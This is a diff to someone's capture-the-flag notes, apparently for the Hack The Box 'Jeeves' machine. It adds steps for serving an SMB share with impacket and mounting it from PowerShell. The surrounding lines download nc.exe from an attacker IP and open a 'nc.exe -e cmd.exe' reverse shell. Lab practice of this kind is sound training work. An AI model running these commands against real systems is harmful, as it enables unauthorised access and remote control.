@@ -35,6 +35,18 @@ Invoke-AllChecks
 indirect show content
 (get-content user.txt).substring(0,16)
 
+SMB server
+https://hackingandsecurity.blogspot.com/2016/08/impacket.html
+Run SMB share
+python smbserver.py TRY ~/Documents/htb/jeeves/smb
+Confirm SMB
+smbclient -L 10.10.14.11 --no-pass      
+
+New-PSDrive -Name "FollowMe" -PSProvider "FileSystem" -Root "\\10.10.14.11\TRY"
+cd FollowMe:
+New-PSDrive -Name "FollowMe" -PSProvider "FileSystem" -Root "\\10.10.14.11\TRY"
+
+
 NC get session
 powershell wget "http://10.10.14.11/nc.exe" -outfile "nc.exe"
 nc.exe -e cmd.exe 10.10.14.11 1234
